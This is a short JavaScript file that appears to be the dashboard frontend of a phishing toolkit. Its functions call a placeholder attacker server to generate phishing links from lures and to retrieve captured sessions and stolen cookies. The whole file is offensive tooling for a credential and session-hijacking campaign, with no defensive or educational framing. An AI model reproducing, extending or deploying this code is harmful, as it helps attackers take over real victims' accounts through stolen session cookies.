const API_BASE_URL = "http://YOUR_SERVER_IP:5000";  // Updated to Port 5000

// Generate Link Function
async function generatePhishingLink(lureId) {
    try {
        let response = await fetch(`${API_BASE_URL}/generate_link`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ lure_id: lureId })
        });
        let data = await response.json();
        if (data.link) {
            alert(`Generated Link: ${data.link}`);
        } else {
            alert("Error generating link.");
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

// Fetch Captured Sessions
async function fetchCapturedSessions() {
    try {
        let response = await fetch(`${API_BASE_URL}/captured_sessions`);
        let data = await response.json();
        if (data) {
            console.log("Captured Sessions:", data);
            // Update table dynamically
        } else {
            alert("No captured sessions.");
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

// Fetch Cookies
async function fetchCookies() {
    try {
        let response = await fetch(`${API_BASE_URL}/get_cookies`);
        let data = await response.json();
        if (data) {
            console.log("Cookies:", data);
            // Update table dynamically
        } else {
            alert("No cookies found.");
        }
    } catch (error) {
        console.error("Error:", error);
    }
}
